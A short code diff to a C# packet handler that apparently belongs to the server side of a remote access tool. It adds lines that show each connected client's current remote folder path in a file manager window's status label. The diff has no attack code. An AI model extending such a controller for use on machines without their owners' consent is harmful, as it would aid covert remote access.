@@ -29,6 +29,7 @@ namespace Server.Handle_Packet
                                     FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                                     if (FM != null)
                                     {
+                                        FM.toolStripStatusLabel1.Text = "";
                                         FM.listView1.Items.Clear();
                                         string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                         for (int i = 0; i < driver.Length; i++)
@@ -60,6 +61,15 @@ namespace Server.Handle_Packet
                                     FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                                     if (FM != null)
                                     {
+                                        FM.toolStripStatusLabel1.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
+                                        if (FM.toolStripStatusLabel1.Text.EndsWith("\\"))
+                                        {
+                                            FM.toolStripStatusLabel1.Text = FM.toolStripStatusLabel1.Text.Substring(0, FM.toolStripStatusLabel1.Text.Length - 1);
+                                        }
+                                        if (FM.toolStripStatusLabel1.Text.Length == 2)
+                                        {
+                                            FM.toolStripStatusLabel1.Text = FM.toolStripStatusLabel1.Text + "\\";
+                                        }
                                         FM.listView1.Items.Clear();
                                         FM.listView1.Groups.Clear();
                                         string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
